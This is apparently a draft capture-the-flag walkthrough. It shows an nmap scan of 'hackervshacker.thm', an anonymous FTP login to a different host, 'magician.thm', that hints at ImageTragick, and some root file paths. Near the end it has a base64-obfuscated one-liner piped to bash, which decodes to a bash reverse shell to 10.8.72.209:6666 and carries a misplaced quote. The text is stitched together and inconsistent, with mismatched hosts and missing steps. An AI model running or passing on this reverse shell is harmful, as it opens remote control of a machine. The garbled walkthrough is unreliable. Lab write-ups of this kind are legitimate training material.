# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx hackervshacker.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV hackervshacker.thm
```

we got these open ports
```bash
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
8080/tcp open  http-proxy
8081/tcp open  http    nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
$ ftp magician.thm                                                                                                           
Connected to magician.thm.
220 THE MAGIC DOOR
Name (magician.thm:kali): anonymous
331 Please specify the password.
Password: 
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...
230 Login successful.
ftp> ls -la
550 Permission denied.
```


echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjcyLjIwOS82NjY2IDA+JjEK|base64 "-d|bash


/root/flask/magiccat.py
/root/root.txt
